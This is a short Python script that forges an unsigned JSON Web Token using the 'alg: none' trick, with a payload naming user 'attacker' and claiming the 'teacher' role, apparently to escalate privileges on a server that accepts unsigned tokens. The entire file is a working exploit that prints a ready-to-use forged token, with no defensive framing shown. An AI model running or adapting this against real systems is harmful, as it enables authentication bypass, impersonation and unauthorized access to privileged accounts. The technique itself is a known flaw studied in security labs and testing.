#!/usr/bin/env python3
"""Build an unsigned (alg:none) JWT that claims the teacher role."""
import base64
import json


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


header = {"alg": "none", "typ": "JWT"}
payload = {"user_id": 9999, "username": "attacker", "role": "teacher"}

h = b64url(json.dumps(header, separators=(",", ":")).encode())
p = b64url(json.dumps(payload, separators=(",", ":")).encode())

# The trailing dot is the empty signature slot: the server splits the token
# into three parts and expects all three to be present.
print(f"{h}.{p}.")
